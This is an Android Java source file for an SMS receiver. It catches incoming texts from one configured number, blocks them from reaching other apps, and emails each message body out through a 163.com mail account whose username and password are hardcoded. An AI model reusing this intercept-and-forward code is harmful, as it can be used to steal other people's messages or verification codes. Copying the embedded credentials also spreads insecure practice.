package com.vito.messageintercept.BroadcastReceiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.vito.messageintercept.Util.EmailUtil;
import com.vito.messageintercept.Util.VerificationUtils;

/**
 * @Description: 短信接收者
 * @Created by Zhangfeng on 2016/5/28.
 * @ModifiedBy: Clowire51
 * @ModifiedTime: 2016/5/28 10:13
 * @ModifiedNotes:
 * @Version
 */
public class MessageReceiver extends BroadcastReceiver{

    public static final String SMS_ADDRESS = "com.vito.provider.Telephony.SMS";
    public static final String NAME = "message_info";
    public static String ADDRESS = "ADDRESS";
    public static String EMAIL = "EMAIL";
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    private String mAddress;
    private String mEmail;

    private EmailUtil emailUtil = new EmailUtil();


    @Override
    public void onReceive(Context context, Intent intent) {
        //intent提取广播的信息
        if (SMS_RECEIVED.equals(intent.getAction())) {   //短信的广播
            setConfig(context);//获取系统配置
            Bundle bundle = intent.getExtras();
            Object messages[] = (Object[]) bundle.get("pdus");
            SmsMessage smsMessage[] = new SmsMessage[messages.length];
            for (int n = 0; n < messages.length; n++) {
                smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
            }
            for (SmsMessage message : smsMessage) {
                if (mAddress.equals(message.getOriginatingAddress())) {
                    this.abortBroadcast();
                    if(VerificationUtils.isEmail(mEmail)){
                        sendEmail(getEmailBody(message));
                    }
                    Toast.makeText(context, "拦截短信", Toast.LENGTH_SHORT).show();
                }
            }
        }else if (SMS_ADDRESS.equals(intent.getAction())) {
//            if (intent.getExtras().getString(SetActivity.ADDRESS) != null) {
//                ADDRESS = intent.getExtras().getString(SetActivity.ADDRESS);
//            }
//            if (intent.getExtras().getString(SetActivity.EMAIL) != null) {
//                EMAIL = intent.getExtras().getString(SetActivity.EMAIL);
//            }
        }
    }

    private void setConfig(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences(NAME,Context.MODE_PRIVATE);
        mAddress = sharedPreferences.getString(ADDRESS,"");
        mEmail = sharedPreferences.getString(EMAIL,"");
    }

    private String getEmailBody(SmsMessage message){
        String result = "phone:"+ mAddress +"\n"+"body:"+message.getMessageBody();
        return result;
    }

    private void sendEmail(final String body){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    emailUtil.sendMailBy163(mEmail, "clowiretest@163.com", "clowire1", "ClowireTest", body, null);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
